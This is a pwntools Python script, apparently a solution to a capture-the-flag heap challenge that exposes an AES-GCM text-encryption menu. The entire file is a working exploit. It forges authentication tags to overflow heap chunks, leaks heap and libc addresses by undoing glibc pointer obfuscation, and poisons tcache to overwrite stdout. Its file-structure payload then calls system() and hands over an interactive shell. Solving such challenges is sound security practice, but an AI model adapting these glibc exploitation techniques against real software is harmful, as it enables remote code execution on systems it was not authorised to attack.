from pwn import *
from Crypto.Cipher import AES
context.binary = ELF("./chall")
libc = ELF('./libc.so.6')
r = remote("localhost", 5000)
r.recvuntil(b'>')

def create(index, dat, nowait=False):
    r.sendline(b'1')
    r.sendline(str(index))
    r.send(dat)
    if not nowait:
        r.recvuntil(b'>')

def read(index):
    r.sendline(b'2')
    r.sendline(str(index))
    r.recvuntil(b'Text: ')
    res = r.recvuntil(b'\n1. Create Text', drop=True)
    r.recvuntil(b'>')
    return res

def encrypt(index):
    r.sendline(b'3')
    r.sendline(str(index))
    r.recvuntil(b'Ciphertext: ')
    res = bytes.fromhex(r.recvline().decode())
    r.recvuntil(b'>')
    return res[:16], res[16:32], res[32:]

def decrypt(index, tag, iv, ct, overload = None):
    r.sendline(b'4')
    r.sendline(str(index))
    if overload:
        r.sendline(overload)
    else:
        r.sendline((tag+iv+ct).hex())
    r.recvuntil(b'>')

def free(index):
    r.sendline(b'5')
    r.sendline(str(index))
    r.recvuntil(b'>')

# deobfucation for pointer encryption if ptr and pos are in the same page
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def ob_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

def deob_ptr(pos, val):
    return ob_ptr(pos, val)

# generates the payload for stdout FSOP
def brother_may_I_have_some_oats(fp_addr):
    fp = FileStructure(null=fp_addr+0x68)
    fp.flags = 0x687320
    fp._IO_read_ptr = 0x0
    fp._IO_write_base = 0x0
    fp._IO_write_ptr = 0x1
    fp._wide_data = fp_addr-0x10
    payload = bytes(fp)
    payload = payload[:0xc8] + p64(libc.sym['system']) + p64(fp_addr + 0x60)
    payload += p64(libc.sym['_IO_wfile_jumps'])
    return payload

create(0, b'a')
create(1, b'a' * 0x178)
create(2, b'a')

free(0)
free(2)

num = 0

while True:
    num += 1
    tag, iv, ct = encrypt(1)


    tag = xor(xor(tag, (0x178 * 8).to_bytes(8, 'big').rjust(16, b'\0')), (0x179 * 8).to_bytes(8, 'big').rjust(16, b'\0'))

    free(1)
    decrypt(1, tag, iv, ct + b'\0')
    res = read(1)
    if len(res) > 0x1a0:
        break
    free(1)
    create(1, b'a' * 0x178)
print(res)

heap_leak = deobfuscate(u64(res[0x190:0x198]))
print(hex(heap_leak))
if (heap_leak >> 12) & 0x40:
    exit("nope")
tag2, iv2, ct2 = encrypt(1)
print(num)

create(2, b'a')
create(0, b'a')




for i in range(10):
    decrypt(3, tag, iv, ct + b'\0')
    free(3)

# use memory leak to move top chunk to 0x40000
decrypt(9, b'', b'', b'', overload= b'f'*(0x20000))
decrypt(9, b'', b'', b'', overload= b'f'*(0xe000))
decrypt(9, b'', b'', b'', overload= b'f'*(0xe000))
decrypt(9, b'', b'', b'', overload= b'f'*(0xe000))
decrypt(9, b'', b'', b'', overload= b'f'*(0xe000))
decrypt(9, b'', b'', b'', overload= (b'f'*(0x4f00)).ljust(0xe000, b'\0'))
decrypt(9, b'', b'', b'', overload= b'f'*(0xf000 * 2))

create(3, b'a')
create(4, b'a')
create(5, b'a')

free(3)
free(5)
free(4)

decrypt(3, tag2, iv2, ct2)
create(4, b'a')

ciph = AES.new(b'a'*0x10, AES.MODE_ECB)

key = ciph.encrypt(b'a'*0x10)

ciph2 = AES.new(key, AES.MODE_ECB)

create(5, ciph.decrypt(b'\0'*0x10) + ciph.decrypt(b'\0'*8 + p64(0x21)) + b'a'*0x10 + ciph2.decrypt(b'\0'*8 + p64(0x191)))

free(4)

from aes_aead import AES_AEAD

gcm = AES_AEAD(key)
ct, tag = gcm.encrypt(b'\0'*16, b'a'*0x178 + p32(0x200))

decrypt(4, tag, b'\0'*16, ct)

res = read(4)

libc.address = u64(res[0x190:0x198]) - 0x7f412fe1ab20 + 0x7f412fc17000

print(hex(libc.address))

create(6, b'a')

free(6)
free(4)
free(3)
ct, tag = gcm.encrypt(b'\0'*0x10, b'a'*0x178 + p64(0x200) + p64(0) + p64(0x191) + p64(libc.symbols['_IO_2_1_stdout_'] ^ ((heap_leak + 0x40000) >> 12)))
decrypt(3, tag, b'\0'*0x10, ct)
create(4, b'a')
create(6, ciph2.decrypt(brother_may_I_have_some_oats(libc.symbols['_IO_2_1_stdout_'])), nowait=True)


r.interactive()
